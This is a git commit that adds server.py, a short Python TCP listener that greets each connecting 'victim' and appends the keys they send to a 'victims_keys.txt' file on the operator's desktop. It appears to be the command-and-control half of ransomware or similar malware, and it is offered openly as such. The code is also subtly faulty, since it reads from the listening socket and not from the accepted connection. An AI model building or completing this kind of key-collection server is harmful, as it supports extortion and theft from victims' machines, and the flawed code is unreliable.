0ecb6cc13a81c8db66bcc56a3c51bb12603e4cf4
Roi Levi <51533978+r0eilevi@users.noreply.github.com>
2020-02-22 20:52:51 +0200

    Create server.py

---
+++ server.py
@@ -0,0 +1,22 @@
+import socket
+import os
+
+file_keys = os.path.join(os.path.expanduser('~/Desktop'), 'victims_keys.txt')
+
+class Server:
+    def __init__(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
+            self.sock.bind(('0.0.0.0', 21512))
+            self.sock.listen()
+            self.conn, self.addr = self.sock.accept()
+            if self.conn:
+                print(f'Victim has joined our session! - {self.addr}')
+                self.recv_info()
+    def recv_info(self):
+        self.key = self.sock.recv(1024).decode()
+        if not os.path.exists(file_keys):
+            with open(file_keys, 'w') as f:
+                f.write(self.key)
+        else:
+            with open(file_keys, 'a') as f:
+                f.write(self.key)
